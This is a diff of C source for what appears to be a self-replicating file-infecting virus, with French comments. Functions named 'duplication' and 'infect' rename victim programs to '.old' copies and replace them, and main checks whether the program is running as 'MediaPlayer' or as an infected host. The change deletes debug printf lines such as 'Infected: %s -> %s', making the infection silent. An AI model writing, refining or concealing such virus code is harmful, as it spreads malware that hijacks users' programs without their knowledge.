@@ -114,10 +114,8 @@ void duplication(char *source, char *ouvreur){
 	// Pour éviter la réinfection
 	struct stat sb;
     	if (stat(dest, &sb) == 0) {
-    		printf("J'ai remarqué une copie %s", dest);
         	return;  // Si le backup existe déjà, on ne fait rien
     	}
-    	printf("Pas de copie %s", dest);
 	
 	rename(source, dest);
 
@@ -137,7 +135,6 @@ void duplication(char *source, char *ouvreur){
 
     close(srcf);
     close(destf);
-    printf("Infected: %s -> %s\n", source, dest);
 } 
 
 void infect(const char *lanceur){
@@ -156,12 +153,10 @@ void infect(const char *lanceur){
 int main(int argc, char *argv[]) {
 	// Vérification de si on est dans un fichier corrompu ou non
   	char *prog_name = basename(argv[0]);
-  	printf("%s", prog_name);
   	if (strcmp(prog_name, "MediaPlayer") != 0) {
         // Construire le nom du fichier .old
         char dest[100];
 	snprintf(dest, sizeof(dest), "%s.old", prog_name);
-	printf("%s", dest);
 	// Pour retrouver le .old
 	struct stat sb;
     	if (stat(dest, &sb) == 0) {
